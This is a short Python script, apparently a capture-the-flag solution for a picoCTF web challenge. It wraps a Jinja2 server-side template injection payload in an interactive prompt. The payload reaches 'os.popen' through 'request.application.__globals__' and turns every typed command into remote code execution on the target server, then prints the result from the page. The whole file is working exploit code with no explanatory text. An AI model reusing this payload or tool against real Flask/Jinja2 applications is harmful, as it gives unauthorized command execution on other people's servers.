import requests
from cmd import Cmd
from bs4 import BeautifulSoup


class Terminal(Cmd):
    prompt = "kali㉿kali $ "
    url="http://shape-facility.picoctf.net:51403/"
    flag=""

    def __init__(self):
        super().__init__()

    def default(self, args):
        ## PAYLOAD 
        payload = r"{{request.application.__globals__.__builtins__.__import__('os').popen('__PLACEHOLDER__').read()}}"
        
        ## REQUEST TO SERVER
        data_parameter = { "content":payload.replace("__PLACEHOLDER__", args)}
        header = { "Content-Type": "application/x-www-form-urlencoded" }
        response = requests.post(self.url, data=data_parameter, headers=header)

        ## PARSING DATA RESPONSE
        soup = BeautifulSoup(response.content, "html.parser")
        hasil = soup.select('h1')[0].text.strip()
        print(hasil)

    def do_Flag(self, args):
        self.flag= args
        print("Flag saved")

    def do_exit(self, args):
        print(f"Thankyou plz submit the flag {self.flag}")
        exit()

c = Terminal()
c.cmdloop()

    
